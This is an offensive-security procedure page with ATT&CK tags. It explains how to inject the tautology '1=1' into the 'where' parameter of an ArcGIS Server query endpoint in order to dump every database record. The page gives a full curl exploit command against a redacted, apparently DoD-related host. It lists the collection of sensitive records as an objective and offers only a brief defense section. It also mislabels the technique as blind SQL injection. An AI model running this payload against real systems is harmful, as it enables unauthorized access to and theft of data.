---
id: proc-002
tags:
  - sqli
  - blind-sqli
  - exfiltration
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-sqli-tautology]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:26.183Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test-SQL-Injection-with-Tautological-Condition

## Summary

This procedure injects a tautological SQL condition ('1=1') into the 'where' parameter of an ArcGIS query to bypass restrictions and retrieve all database records, confirming the SQL injection vulnerability.

## Description

ArcGIS Server versions like 10.1 SP1 concatenate user input from the 'where' parameter directly into SQL queries without sanitization, as per Esri documentation. By setting 'where=1=1', the query becomes always true, returning unrestricted data. This blind SQLi technique exposes sensitive DoD records, enabling data exfiltration in a real attack scenario.

## Requirements

1. Access to the ArcGIS query endpoint
2. URL encoding knowledge for payloads (e.g., %3D for =)
3. Tool for sending modified HTTP requests

## Defense

Defensive measures and detection strategies:

- Sanitize 'where' inputs using prepared statements
- Monitor query logs for tautological conditions like '1=1'
- Restrict endpoint access via IP whitelisting or authentication

## Objectives

1. Bypass SQL filters to access full dataset
2. Verify injection success through data volume
3. Collect sensitive records for further analysis

## Instructions

### Step 1: Inject Tautological Payload

**Context**: Modify the 'where' parameter to '1=1' (URL-encoded as 1%3D1) and execute the query to dump all records.

**Command** ([[commands/curl-sqli-tautology]]):
```bash
curl "https://█████/arcgis/rest/services/Data/ANC_External/MapServer/1/query?where=1%3D1&text=&objectIds=&time=&timeRelation=esriTimeRelationOverlaps&geometry=&geometryType=esriGeometryEnvelope&inSR=&spatialRel=esriSpatialRelIntersects&distance=&units=esriSRUnit_Foot&relationParam=&outFields=&returnGeometry=true&returnTrueCurves=false&maxAllowableOffset=&geometryPrecision=&outSR=&havingClause=&returnIdsOnly=false&returnCountOnly=false&orderByFields=&groupByFieldsForStatistics=&outStatistics=&returnZ=false&returnM=false&gdbVersion=&historicMoment=&returnDistinctValues=false&resultOffset=&resultRecordCount=&returnExtentOnly=false&sqlFormat=none&datumTransformation=&parameterValues=&rangeValues=&quantizationParameters=&featureEncoding=esriDefault&f=html"
```

> The response will include all database records in HTML format. Compare against a normal query to confirm expanded output.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-sqli-tautology]]

## Tools Used


## Tags

- [[sqli]]
- [[blind-sqli]]
